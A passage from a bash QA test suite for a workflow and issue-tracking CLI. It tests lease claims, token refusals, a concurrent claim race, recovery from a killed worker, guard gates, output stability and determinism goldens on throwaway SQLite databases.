  DOCKET_TOKEN=notthetoken run_env "$ZG_S" step complete STEP-2 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R3_exit" 5
  assert_json "ZG" "ZG14_R3_code" ".code" "AUTH_ERROR"
  ZG_V_AFTER=$(zg_step_version 2)
  check_cond "ZG" "ZG14_R3_no_write" "row_version moved on a refusal" [ "$ZG_V_BEFORE" = "$ZG_V_AFTER" ]

  # R5: claim against a LIVE lease.
  run_env "$ZG_S" step claim STEP-2 --owner other --json
  assert_exit "ZG" "ZG14_R5_exit" 4
  assert_json "ZG" "ZG14_R5_code" ".code" "CONFLICT"

  # R4: correct token, lease EXPIRED. The expiry is forced by moving
  # `expires_ms` into the past rather than by sleeping out a TTL — the refusal
  # under test is "the clock says this lapsed", and asserting it does not
  # require actually waiting, only that the column is in the past.
  #
  # The token below is the RIGHT one — minted by a real claim — presented
  # against a lease whose expiry has been moved into the past. That is exactly
  # R4's row, and what distinguishes it from R3's wrong token above.
  #
  # The R3/R5 lease is expired FIRST so this claim can win it (R7's own
  # behavior, already asserted below); otherwise the setup claim would be
  # refused by the live lease it is meant to replace.
  local ZG_TOKEN2
  sqlite3 "$ZG_S/issues.db" "UPDATE steps SET expires_ms=1 WHERE id=2;"
  run_env "$ZG_S" step claim STEP-2 --owner r4-owner --json
  assert_exit "ZG" "ZG14_R4_setup_claim" 0
  ZG_TOKEN2=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
  sqlite3 "$ZG_S/issues.db" "UPDATE steps SET expires_ms=1 WHERE id=2;"

  ZG_V_BEFORE=$(zg_step_version 2)
  DOCKET_TOKEN="$ZG_TOKEN2" run_env "$ZG_S" step complete STEP-2 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R4_exit" 6
  assert_json "ZG" "ZG14_R4_code" ".code" "STALE_LEASE"
  ZG_V_AFTER=$(zg_step_version 2)
  check_cond "ZG" "ZG14_R4_no_write" "row_version moved on a refusal" [ "$ZG_V_BEFORE" = "$ZG_V_AFTER" ]

  # R7: claim against an EXPIRED lease SUCCEEDS, with attempt++.
  #
  # The assertion is the DELTA, not an absolute count: the rows above claim
  # this step several times to set up their own conditions, and an absolute
  # number would have to be re-derived every time one of them changed. What R7
  # actually claims is that a winning claim over an expired lease increments by
  # exactly one.
  local ZG_ATTEMPT_BEFORE ZG_ATTEMPT
  ZG_ATTEMPT_BEFORE=$(sqlite3 "$ZG_S/issues.db" "SELECT attempt FROM steps WHERE id=2;")
  run_env "$ZG_S" step claim STEP-2 --owner zg-worker-2 --json
  assert_exit "ZG" "ZG14_R7_exit" 0
  ZG_ATTEMPT=$(sqlite3 "$ZG_S/issues.db" "SELECT attempt FROM steps WHERE id=2;")
  check_cond "ZG" "ZG14_R7_attempt" "attempt went $ZG_ATTEMPT_BEFORE -> $ZG_ATTEMPT on a winning claim, want +1" [ "$ZG_ATTEMPT" = "$((ZG_ATTEMPT_BEFORE + 1))" ]
  local ZG_TOKEN3
  ZG_TOKEN3=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')

  # R9: `complete` after the token retired.
  DOCKET_TOKEN="$ZG_TOKEN3" run_env "$ZG_S" step complete STEP-2 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R9_first" 0
  DOCKET_TOKEN="$ZG_TOKEN3" run_env "$ZG_S" step complete STEP-2 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG14_R9_exit" 5
  assert_json "ZG" "ZG14_R9_code" ".code" "AUTH_ERROR"
  # And no duplicate artifact was recorded.
  local ZG_ARTS
  ZG_ARTS=$(sqlite3 "$ZG_S/issues.db" \
    "SELECT COUNT(*) FROM artifacts WHERE step_id=2 AND kind='findings';")
  check_cond "ZG" "ZG14_R9_no_duplicate" "$ZG_ARTS findings artifacts after a double complete" [ "$ZG_ARTS" = "1" ]

  # R8: claim a step that is NOT ready — the refusal names the unmet condition.
  run_env "$ZG_S" step claim STEP-10 --owner zg-worker --json
  assert_exit "ZG" "ZG14_R8_exit" 4
  assert_json "ZG" "ZG14_R8_code" ".code" "CONFLICT"
  assert_stdout_contains "ZG" "ZG14_R8_names_condition" "predecessor"

  # R10: approve/reject on a NON-human step.
  run_env "$ZG_S" step approve STEP-3 --json
  assert_exit "ZG" "ZG14_R10_exit" 3
  assert_json "ZG" "ZG14_R10_code" ".code" "VALIDATION_ERROR"
  run_env "$ZG_S" step reject STEP-3 --json
  assert_exit "ZG" "ZG14_R10_reject_exit" 3

  # R11: resolve on a step that is not parked.
  run_env "$ZG_S" step resolve STEP-3 --as skip --json
  assert_exit "ZG" "ZG14_R11_exit" 3
  assert_json "ZG" "ZG14_R11_code" ".code" "VALIDATION_ERROR"

  # R12: an artifact over the 1MiB cap, naming the size AND the cap.
  run_env "$ZG_S" step claim STEP-3 --owner zg-worker --json
  local ZG_TOKEN4
  ZG_TOKEN4=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
  perl -e 'print "x" x (1024*1024 + 1)' >"$ZG_TMP/oversized.txt"
  ZG_V_BEFORE=$(zg_step_version 3)
  DOCKET_TOKEN="$ZG_TOKEN4" run_env "$ZG_S" step complete STEP-3 \
    --artifact-file "$ZG_TMP/oversized.txt" --json
  assert_exit "ZG" "ZG14_R12_exit" 3
  assert_json "ZG" "ZG14_R12_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG14_R12_names_size" "1048577"
  assert_stdout_contains "ZG" "ZG14_R12_names_cap" "1048576"
  ZG_V_AFTER=$(zg_step_version 3)
  check_cond "ZG" "ZG14_R12_no_write" "row_version moved on a refusal" [ "$ZG_V_BEFORE" = "$ZG_V_AFTER" ]

  # ---------------------------------------------------------------------------
  # ZG15: R6 — the claim race at STEP level, with REAL PROCESSES.
  #
  # N background claimants against one ready step: exactly one wins, the rest
  # are CONFLICT, and the attempt counter records exactly one claim. In-process
  # goroutines share a connection pool; separate processes do not, so this is
  # the mutual exclusion an operator actually gets.
  # ---------------------------------------------------------------------------

  local ZG_RACE
  ZG_RACE=$(qa_mktemp_d)
  run_env "$ZG_RACE" init >/dev/null
  run_env "$ZG_RACE" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_RACE" workflow register "$FIXTURE" --json >/dev/null
  run_env "$ZG_RACE" issue create -t "race" -d "body" --json >/dev/null
  run_env "$ZG_RACE" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_RACE" run activate RUN-1 --json >/dev/null

  local ZG_RACE_OUT
  ZG_RACE_OUT=$(qa_mktemp_d)
  local i
  for i in 1 2 3 4 5 6; do
    (
      # `set +e` is REQUIRED here: the suite runs under `set -e`, which every
      # subshell inherits, so a losing claimant's exit 4 would kill the subshell
      # before it recorded its own exit code — and the race would silently look
      # like one winner and five vanished processes.
      set +e
      DOCKET_PATH="$ZG_RACE" "$DOCKET" step claim STEP-1 \
        --owner "racer-$i" --json >"$ZG_RACE_OUT/$i.out" 2>&1
      printf '%s' "$?" >"$ZG_RACE_OUT/$i.exit"
    ) &
  done
  wait

  local ZG_WINNERS=0 ZG_LOSERS=0 ZG_OTHER=0
  for i in 1 2 3 4 5 6; do
    case "$(cat "$ZG_RACE_OUT/$i.exit")" in
      0) ZG_WINNERS=$((ZG_WINNERS + 1)) ;;
      4) ZG_LOSERS=$((ZG_LOSERS + 1)) ;;
      *) ZG_OTHER=$((ZG_OTHER + 1)) ;;
    esac
  done

  # EXACTLY ONE WINNER is the invariant. Everything else about this race is
  # scheduling weather.
  check_cond "ZG" "ZG15_one_winner" "$ZG_WINNERS winners among 6 claimants" [ "$ZG_WINNERS" = "1" ]

  # Every loser is refused; HOW each refusal surfaces is scheduling weather.
  # Most are CONFLICT, but a straggler may instead exhaust SQLite's
  # busy_timeout while the winner holds the write lock and surface as a
  # general error — that is a contended-database symptom, not a claim that
  # succeeded, so there is deliberately NO floor on how many refusals carry
  # CONFLICT specifically (DKT-34: such a floor asserted on the weather and
  # flaked under load). What must never happen is a loser exiting 0, which
  # shows up here as fewer than five refusals and in ZG15_one_winner as a
  # second winner.
  check_cond "ZG" "ZG15_losers_refused" "want 5 refused claimants among 6, got $((ZG_LOSERS + ZG_OTHER)) ($ZG_LOSERS CONFLICT, $ZG_OTHER other)" [ "$((ZG_LOSERS + ZG_OTHER))" = "5" ]

  local ZG_RACE_ATTEMPT
  ZG_RACE_ATTEMPT=$(sqlite3 "$ZG_RACE/issues.db" \
    "SELECT attempt FROM steps WHERE instance='implement@0';")
  check_cond "ZG" "ZG15_attempt_one" "attempt = $ZG_RACE_ATTEMPT after 6 concurrent claims; a loser wrote" [ "$ZG_RACE_ATTEMPT" = "1" ]
  rm -rf "$ZG_RACE_OUT"

  # ---------------------------------------------------------------------------
  # ZG16: §9 item 4 IN FULL — kill a claimer mid-step; expiry ALONE re-readies
  # it; a second worker completes it; THE RUN REACHES `done`; the attempt trail
  # is complete.
  #
  # The S2 QA proved the issue-level half. This is the whole of it at step
  # level, including the part S2 could not prove: that the run finishes.
  # ---------------------------------------------------------------------------

  local ZG_K
  ZG_K=$(qa_mktemp_d)
  run_env "$ZG_K" init >/dev/null
  run_env "$ZG_K" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_K" workflow register "$FIXTURE" --json >/dev/null
  zg_trust_fixture_gates "$ZG_K"
  run_env "$ZG_K" issue create -t "killed" -d "body" --json >/dev/null
  run_env "$ZG_K" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_K" run activate RUN-1 --json >/dev/null

  # A claimer with a short TTL, killed WITHOUT releasing.
  local ZG_K_OUT
  ZG_K_OUT=$(qa_mktemp)
  (
    DOCKET_PATH="$ZG_K" "$DOCKET" step claim STEP-1 \
      --owner doomed --ttl 1s --json >"$ZG_K_OUT" 2>&1
    sleep 30
  ) &
  local ZG_K_PID=$!
  local ZG_WAITED=0
  while [ ! -s "$ZG_K_OUT" ] && [ "$ZG_WAITED" -lt 50 ]; do
    perl -e 'select(undef,undef,undef,0.1)'
    ZG_WAITED=$((ZG_WAITED + 1))
  done
  kill -9 "$ZG_K_PID" 2>/dev/null || true
  wait "$ZG_K_PID" 2>/dev/null || true

  local ZG_K_TOKEN
  ZG_K_TOKEN=$(jq -r '.data.token' <"$ZG_K_OUT" 2>/dev/null || echo "")
  if [ -n "$ZG_K_TOKEN" ] && [ "$ZG_K_TOKEN" != "null" ]; then
    check "ZG" "ZG16_claimed" "PASS"
  else
    check "ZG" "ZG16_claimed" "FAIL" "the claimer produced no token"
  fi
  rm -f "$ZG_K_OUT"

  # (a) The step reads effective-not-live WITH NO INTERVENING COMMAND. Nothing
  # runs between the kill and this read — no reaper, no sweep, no `next`.
  #
  # The wait is generous relative to the 1s TTL because the assertion is about
  # EXPIRY ALONE re-readying the step, not about how quickly it does so. A
  # margin that is merely sufficient on an idle laptop makes this section fail
  # on a loaded CI runner for a reason that has nothing to do with the rule
  # under test.
  perl -e 'select(undef,undef,undef,2.5)'
  run_env "$ZG_K" step show STEP-1 --json
  assert_exit "ZG" "ZG16_show_exit" 0
  local ZG_K_EFF
  ZG_K_EFF=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.status')
  if [ "$ZG_K_EFF" = "ready" ] || [ "$ZG_K_EFF" = "pending" ]; then
    check "ZG" "ZG16_effective_not_live" "PASS"
  else
    check "ZG" "ZG16_effective_not_live" "FAIL" \
      "effective status is $ZG_K_EFF; a lapsed lease must read as gone"
  fi
  # And the READ wrote nothing: the stale owner survives until a claim or next.
  local ZG_K_OWNER
  ZG_K_OWNER=$(sqlite3 "$ZG_K/issues.db" \
    "SELECT COALESCE(owner,'') FROM steps WHERE instance='implement@0';")
  check_cond "ZG" "ZG16_read_wrote_nothing" "the read reaped: owner is now '$ZG_K_OWNER'" [ "$ZG_K_OWNER" = "doomed" ]

  # (b) `next --run` re-offers it, and the reap is the write that does it.
  run_env "$ZG_K" next --run RUN-1 --json
  assert_exit "ZG" "ZG16_next_exit" 0
  assert_json "ZG" "ZG16_reoffered" '.data.steps[0].instance' "implement@0"

  # (c) A SECOND worker claims and completes it. No operator action intervened.
  run_env "$ZG_K" step claim STEP-1 --owner survivor --json=v2
  assert_exit "ZG" "ZG16_second_claim" 0
  local ZG_K_TOKEN2
  ZG_K_TOKEN2=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
  # (e) The attempt trail records BOTH claims. `attempt` surfaces under v2
  # only — v1's claim shape is §11.4's four fields and nothing else.
  assert_json "ZG" "ZG16_attempt_trail" ".data.attempt" "2"

  DOCKET_TOKEN="$ZG_K_TOKEN2" run_env "$ZG_K" step complete STEP-1 \
    --artifact-file "$ZG_TMP/artifact.txt" --json
  assert_exit "ZG" "ZG16_second_complete" 0

  # (d) THE RUN REACHES `done` — the part S2 could not prove. Drive the rest of
  # the pipeline; every step completes through the ordinary verbs.
  local ZG_SID ZG_ST ZG_KIND ZG_TOK ZG_ROUNDS=0
  while [ "$ZG_ROUNDS" -lt 20 ]; do
    ZG_ROUNDS=$((ZG_ROUNDS + 1))
    run_env "$ZG_K" next --run RUN-1 --json
    ZG_SID=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.steps[0].step // empty')
    [ -z "$ZG_SID" ] && break
    ZG_KIND=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.steps[0].kind')
    if [ "$ZG_KIND" = "human" ]; then
      run_env "$ZG_K" step approve "$ZG_SID" --json
      continue
    fi
    run_env "$ZG_K" step claim "$ZG_SID" --owner survivor --json
    ZG_TOK=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
    if [ "$ZG_SID" = "STEP-8" ]; then
      # `verify` carries an equality threshold; a `met` payload routes pass.
      printf '[{"status":"met"}]\n' >"$ZG_TMP/payload.json"
      DOCKET_TOKEN="$ZG_TOK" run_env "$ZG_K" step complete "$ZG_SID" \
        --artifact-file "$ZG_TMP/artifact.txt" \
        --payload-file "$ZG_TMP/payload.json" --json
    else
      DOCKET_TOKEN="$ZG_TOK" run_env "$ZG_K" step complete "$ZG_SID" \
        --artifact-file "$ZG_TMP/artifact.txt" --json
    fi
  done

  local ZG_K_RUN
  ZG_K_RUN=$(sqlite3 "$ZG_K/issues.db" "SELECT status FROM runs WHERE id=1;")
  check_cond "ZG" "ZG16_run_done" "the run is $ZG_K_RUN after a killed claimer; §9 item 4 requires it to finish" [ "$ZG_K_RUN" = "done" ]

  # The attempt trail survived to the end: the dead claim is still counted.
  local ZG_K_ATT
  ZG_K_ATT=$(sqlite3 "$ZG_K/issues.db" \
    "SELECT attempt FROM steps WHERE instance='implement@0';")
  check_cond "ZG" "ZG16_trail_complete" "attempt = $ZG_K_ATT; the killed claim must remain in the trail" [ "$ZG_K_ATT" = "2" ]

  # ---------------------------------------------------------------------------
  # ZG17: `guard stop` and `guard gate` — exit 0 allow / exit 2 deny (§6.12).
  # ---------------------------------------------------------------------------

  # The finished run allows a stop.
  run_env "$ZG_K" guard stop
  assert_exit "ZG" "ZG17_stop_allows" 0

  # The mid-flight run denies one, with a reason.
  run_env "$ZG_S" guard stop
  assert_exit "ZG" "ZG17_stop_denies" 2
  assert_stderr_contains "ZG" "ZG17_stop_reason" "pending"

  # `guard gate` denies before the approve and allows after it, on a run that
  # is still ACTIVE — the guard scopes to active runs, so ZG16's finished run
  # is deliberately not the subject here. Drive a fresh run to its gate.
  local ZG_G
  ZG_G=$(qa_mktemp_d)
  run_env "$ZG_G" init >/dev/null
  run_env "$ZG_G" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_G" workflow register "$FIXTURE" --json >/dev/null
  run_env "$ZG_G" issue create -t "gated" -d "body" --json >/dev/null
  run_env "$ZG_G" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_G" run activate RUN-1 --json >/dev/null

  local ZG_G_SID ZG_G_KIND ZG_G_TOK ZG_G_ROUNDS=0
  while [ "$ZG_G_ROUNDS" -lt 20 ]; do
    ZG_G_ROUNDS=$((ZG_G_ROUNDS + 1))
    run_env "$ZG_G" next --run RUN-1 --json
    ZG_G_SID=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.steps[0].step // empty')
    [ -z "$ZG_G_SID" ] && break
    ZG_G_KIND=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.steps[0].kind')
    # STOP at the human gate: this is the state the guard is about.
    [ "$ZG_G_KIND" = "human" ] && break
    run_env "$ZG_G" step claim "$ZG_G_SID" --owner g --json
    ZG_G_TOK=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
    if [ "$ZG_G_SID" = "STEP-8" ]; then
      printf '[{"status":"met"}]\n' >"$ZG_TMP/payload.json"
      DOCKET_TOKEN="$ZG_G_TOK" run_env "$ZG_G" step complete "$ZG_G_SID" \
        --artifact-file "$ZG_TMP/artifact.txt" \
        --payload-file "$ZG_TMP/payload.json" --json
    else
      DOCKET_TOKEN="$ZG_G_TOK" run_env "$ZG_G" step complete "$ZG_G_SID" \
        --artifact-file "$ZG_TMP/artifact.txt" --json
    fi
  done

  # BEFORE the approve: denied, and the reason says why.
  run_env "$ZG_G" guard gate --step commit-gate
  assert_exit "ZG" "ZG17_gate_denies" 2
  assert_stderr_contains "ZG" "ZG17_gate_reason" "not approved"

  run_env "$ZG_G" step approve "$ZG_G_SID" --json
  assert_exit "ZG" "ZG17_approve" 0

  # AFTER the approve: allowed.
  run_env "$ZG_G" guard gate --step commit-gate
  assert_exit "ZG" "ZG17_gate_allows" 0

  # An absent gate denies rather than erroring.
  run_env "$ZG_G" guard gate --step no-such-gate
  assert_exit "ZG" "ZG17_gate_absent" 2
  assert_stderr_contains "ZG" "ZG17_gate_absent_reason" \
    "no \`type=\"human\"\` or \`type=\"vote\"\` step"

  # ---------------------------------------------------------------------------
  # ZG18: phase-3 dormancy (§3) — an ACTIVATED run's issues read
  # byte-identically under --json=v1 and in human mode.
  #
  # Step and lease data may surface only under --json=v2. This is the phase's
  # own dormancy proof: a stopped stage is a dormant stage.
  # ---------------------------------------------------------------------------

  local ZG_D1 ZG_D2
  run_env "$ZG_S" issue show DKT-1 --json=v1
  ZG_D1="$CMD_STDOUT"
  run_env "$ZG_S" issue show DKT-1 --json=v1
  ZG_D2="$CMD_STDOUT"
  check_cond "ZG" "ZG18_v1_stable" "issue show --json=v1 is not stable" [ "$ZG_D1" = "$ZG_D2" ]

  # No step vocabulary reaches the v1 payload of an existing verb.
  local ZG_LEAK=""
  local ZG_TERM
  for ZG_TERM in '"step"' '"instance"' '"lease_ttl_s"' '"saga_stage"' '"routing"'; do
    case "$ZG_D1" in
      *"$ZG_TERM"*) ZG_LEAK="$ZG_LEAK $ZG_TERM" ;;
    esac
  done
  check_cond "ZG" "ZG18_no_step_leak_v1" "issue show --json=v1 leaked:$ZG_LEAK" [ -z "$ZG_LEAK" ]

  # Human mode likewise — with one DKT-294 carve-out. The live-status mirror's
  # activity-trail comment ("implement@0 claimed.") is a CORE comment, always
  # rendered regardless of --json=v2 (internal/engine/store.go's
  # commentEngineEvent), and it deliberately names the claiming instance — that
  # IS the trail's content, per reflectIssueOnClaim's own doc comment and
  # pinned by TestClaimMovesTodoIssueToInProgress. So an instance label
  # reaching human mode via a comment is expected; the internal identifiers a
  # comment would never legitimately contain — a bare `STEP-` id or `saga` —
  # are not.
  run_env "$ZG_S" issue show DKT-1
  local ZG_HUMAN="$CMD_STDOUT"
  ZG_LEAK=""
  for ZG_TERM in 'STEP-' 'saga'; do
    case "$ZG_HUMAN" in
      *"$ZG_TERM"*) ZG_LEAK="$ZG_LEAK $ZG_TERM" ;;
    esac
  done
  check_cond "ZG" "ZG18_no_step_leak_human" "issue show leaked:$ZG_LEAK" [ -z "$ZG_LEAK" ]

  # And `next` WITHOUT --run is untouched by any of it: the issue-mode verb, on
  # a database with ten steps and an activated run, still lists issues.
  run_env "$ZG_S" next --json=v1
  assert_exit "ZG" "ZG18_next_issue_mode" 0
  assert_json_exists "ZG" "ZG18_next_issues_key" ".data.issues"


  # ---------------------------------------------------------------------------
  # ZG19: §9 item 5 — determinism, at three levels (§8.3).
  #
  #   1. TOPOLOGY GOLDEN. The same inputs expand to the same step table, byte
  #      for byte, on a fresh database.
  #   2. CONTEXT-BUNDLE GOLDENS. Every step's bundle is golden-diffed.
  #   3. MID-RUN EDIT IMMUNITY. Between two identical `step context` calls,
  #      edit the issue body, its title, add a label, change its --scope,
  #      modify a pinned file ON DISK, and modify the working tree. The second
  #      call must be BYTE-IDENTICAL.
  #
  # The goldens' SENSITIVITY is itself verified at the end: a deliberate change
  # to a pinned input must change the golden, or a passing diff is vacuous.
  # ---------------------------------------------------------------------------

  local ZG_GOLD="$SCRIPT_DIR/qa/fixtures/context"
  local ZG_DET
  ZG_DET=$(qa_mktemp_d)
  run_env "$ZG_DET" init >/dev/null
  run_env "$ZG_DET" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_DET" workflow register "$FIXTURE" --json >/dev/null
  run_env "$ZG_DET" issue create -t "golden subject" \
    -d "the golden request body" --json >/dev/null
  run_env "$ZG_DET" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_DET" run activate RUN-1 --json >/dev/null

  # (1) The topology golden.
  local ZG_TOPO
  ZG_TOPO=$(sqlite3 -noheader "$ZG_DET/issues.db" \
    "SELECT instance || '|' || kind || '|' || status || '|' ||
            COALESCE(executor,'') || '|' || COALESCE(class,'')
       FROM steps ORDER BY id;")
  check_cond "ZG" "ZG19_topology_golden" "the expanded step table does not match the committed topology golden" [ "$ZG_TOPO" = "$(cat "$ZG_GOLD/topology.golden")" ]

  # (2) The per-step context goldens, all ten.
  local ZG_N ZG_BUNDLE ZG_GOLDEN_FAILS=""
  for ZG_N in 1 2 3 4 5 6 7 8 9 10; do
    run_env "$ZG_DET" step context "STEP-$ZG_N" --json
    ZG_BUNDLE=$(printf '%s' "$CMD_STDOUT" | jq -S '.data.context')
    if [ "$ZG_BUNDLE" != "$(cat "$ZG_GOLD/step-$ZG_N.golden")" ]; then
      ZG_GOLDEN_FAILS="$ZG_GOLDEN_FAILS STEP-$ZG_N"
    fi
  done
  check_cond "ZG" "ZG19_context_goldens" "bundles differ from their goldens:$ZG_GOLDEN_FAILS" [ -z "$ZG_GOLDEN_FAILS" ]

  # (3) MID-RUN EDIT IMMUNITY. Capture every bundle, mutate everything a live
  # read could reach, and require byte-identical output.
  local ZG_BEFORE_DIR ZG_AFTER
  ZG_BEFORE_DIR=$(qa_mktemp_d)
  for ZG_N in 1 2 3 4 5 6 7 8 9 10; do
    run_env "$ZG_DET" step context "STEP-$ZG_N" --json
    printf '%s' "$CMD_STDOUT" | jq -S '.data.context' >"$ZG_BEFORE_DIR/$ZG_N"
  done

  run_env "$ZG_DET" issue edit DKT-1 -t "EDITED TITLE" --json
  assert_exit "ZG" "ZG19_edit_title" 0
  run_env "$ZG_DET" issue edit DKT-1 -d "EDITED BODY" --json
  assert_exit "ZG" "ZG19_edit_body" 0
  run_env "$ZG_DET" issue label add DKT-1 mid-run --json
  run_env "$ZG_DET" issue edit DKT-1 --scope 'internal/EDITED/**' --json
  assert_exit "ZG" "ZG19_edit_scope" 0
  # And the working tree: a file that did not exist when the run activated.
  printf 'a working-tree change\n' >"$ZG_TMP/tree-change.txt"

  local ZG_IMMUNE_FAILS=""
  for ZG_N in 1 2 3 4 5 6 7 8 9 10; do
    run_env "$ZG_DET" step context "STEP-$ZG_N" --json
    ZG_AFTER=$(printf '%s' "$CMD_STDOUT" | jq -S '.data.context')
    if [ "$ZG_AFTER" != "$(cat "$ZG_BEFORE_DIR/$ZG_N")" ]; then
      ZG_IMMUNE_FAILS="$ZG_IMMUNE_FAILS STEP-$ZG_N"
    fi
  done
  check_cond "ZG" "ZG19_mid_run_edit_immunity" "bundles changed after a mid-run edit:$ZG_IMMUNE_FAILS" [ -z "$ZG_IMMUNE_FAILS" ]

  # Each mutated field individually, so a partial snapshot fails on the field
  # it missed rather than on an opaque whole-bundle diff.
  run_env "$ZG_DET" step context STEP-1 --json
  assert_json "ZG" "ZG19_title_frozen" \
    ".data.context.issue.title" "golden subject"
  assert_json "ZG" "ZG19_body_frozen" \
    ".data.context.issue.body_snapshot" "the golden request body"
  assert_json "ZG" "ZG19_labels_frozen" \
    '.data.context.issue.labels | length' "0"
  assert_json "ZG" "ZG19_scope_frozen" \
    '.data.context.issue.scope | length' "0"

  # The live row DID change — otherwise the four assertions above are vacuous.
  local ZG_LIVE_TITLE
  ZG_LIVE_TITLE=$(sqlite3 "$ZG_DET/issues.db" "SELECT title FROM issues WHERE id=1;")
  check_cond "ZG" "ZG19_live_row_did_change" "the live title is '$ZG_LIVE_TITLE'; the immunity assertions proved nothing" [ "$ZG_LIVE_TITLE" = "EDITED TITLE" ]

  # GOLDEN SENSITIVITY (the ZF4b precedent): a deliberate change to a PINNED
  # INPUT must change the bundle. A verification that cannot fail is not a
  # verification.
  local ZG_SENS
  ZG_SENS=$(qa_mktemp_d)
  run_env "$ZG_SENS" init >/dev/null
  run_env "$ZG_SENS" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_SENS" workflow register "$FIXTURE" --json >/dev/null
  run_env "$ZG_SENS" issue create -t "golden subject" \
    -d "A DIFFERENT REQUEST BODY" --json >/dev/null
  run_env "$ZG_SENS" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_SENS" run activate RUN-1 --json >/dev/null
  run_env "$ZG_SENS" step context STEP-1 --json
  local ZG_SENS_BUNDLE
  ZG_SENS_BUNDLE=$(printf '%s' "$CMD_STDOUT" | jq -S '.data.context')
  check_cond "ZG" "ZG19_goldens_are_sensitive" "a changed request body produced the SAME bundle; the goldens are vacuous" [ "$ZG_SENS_BUNDLE" != "$(cat "$ZG_GOLD/step-1.golden")" ]

  rm -rf "$ZG_DET" "$ZG_BEFORE_DIR" "$ZG_SENS"

  # ===========================================================================
  # PHASE 4 — loops, joins, and events (TDD §7)
  # ===========================================================================

  # ---------------------------------------------------------------------------
  # ZG20: THE FULL LOOP RUN, over the committed fixture (§7.7's 11-step plan).
  #
  # The loop is driven at `verify`, NOT at `reconcile`, and the distinction is
  # the whole reason §7.7 specifies this run step by step. The fixture declares
  # two `fix-loop` thresholds and only one of them can fire at S3:
  #
  #   reconcile  { "fix-loop" = "any(severity >= high)" }   an ORDERED comparison
  #              over the stub runner's EMPTY payload (§6.13). §6.14 T4
  #              short-circuits `any` over zero payloads to FALSE before the
  #              `>=` is attempted, so no match => `pass`. Nothing is guessed
  #              and the ordered comparison is never evaluated.
  #   verify     { "fix-loop" = "any(status == unmet)", ... }   an EQUALITY
  #              operator, live at S3 per §6.14 T1, over a payload the harness
  #              supplies on `step complete --payload-file`.
  #
  # GATES ARE STUBBED at S3 (§5.6): every gate result rides `stub: true` and no
  # subprocess runs. The loop's control flow is real; the gate verdicts are not.
  # ---------------------------------------------------------------------------

  local ZG_L
  ZG_L=$(qa_mktemp_d)
  run_env "$ZG_L" init >/dev/null
  run_env "$ZG_L" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_L" workflow register "$FIXTURE" --json >/dev/null
  zg_trust_fixture_gates "$ZG_L"
  run_env "$ZG_L" issue create -t "ZG20 loop subject" -d "the loop body" --json >/dev/null
  run_env "$ZG_L" run start --issue DKT-1 --json >/dev/null

  # Step 1: activate; `next --run` offers implement@0; claim and complete it.
  run_env "$ZG_L" run activate RUN-1 --json
  assert_exit "ZG" "ZG20_activate" 0

  printf 'the change summary\n' >"$ZG_TMP/artifact.txt"
  printf '[{"status":"unmet"}]\n' >"$ZG_TMP/unmet.json"
  printf '[{"status":"met"}]\n' >"$ZG_TMP/met.json"

  run_env "$ZG_L" next --run RUN-1 --json
  assert_json "ZG" "ZG20_first_offer" ".data.steps[0].instance" "implement@0"

  zg_complete_step "$ZG_L" "implement@0" "$ZG_TMP/artifact.txt" ""
  assert_exit "ZG" "ZG20_implement_complete" 0

  # Step 2: the four review siblings become ready (fanout); the join (J1) waits
  # for all four before `synthesize` is offered.
  local ZG_L_READY
  ZG_L_READY=$(zg_ready_instances "$ZG_L")
  if printf '%s' "$ZG_L_READY" | grep -q 'review@0#0' &&
     printf '%s' "$ZG_L_READY" | grep -q 'review@0#3'; then
    check "ZG" "ZG20_fanout_ready" "PASS"
  else
    check "ZG" "ZG20_fanout_ready" "FAIL" "ready set is '$ZG_L_READY', want review@0#0..#3"
  fi

  zg_complete_step "$ZG_L" "review@0#0" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@0#1" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@0#2" "$ZG_TMP/artifact.txt" ""

  # THE JOIN HOLDS at three of four (J1) — asserted before the fourth lands, so
  # a join that released early fails here rather than passing silently.
  ZG_L_READY=$(zg_ready_instances "$ZG_L")
  if printf '%s' "$ZG_L_READY" | grep -q 'synthesize@0'; then
    check "ZG" "ZG20_join_waits" "FAIL" \
      "synthesize@0 is ready with review@0#3 outstanding; J1 requires every sibling"
  else
    check "ZG" "ZG20_join_waits" "PASS"
  fi

  zg_complete_step "$ZG_L" "review@0#3" "$ZG_TMP/artifact.txt" ""

  # Step 3: synthesize@0, then reconcile@0 — an ACTION step, which `next` drives
  # ENGINE-SIDE (§6.15). It is never claimed; `claim` refuses it.
  zg_complete_step "$ZG_L" "synthesize@0" "$ZG_TMP/artifact.txt" ""
  run_env "$ZG_L" next --run RUN-1 --json >/dev/null

  # Counted rather than compared: the claim under test is that the ACTION's
  # output kind comes from params.output, so the question is whether such an
  # artifact exists, not how many there are.
  local ZG_L_ACT
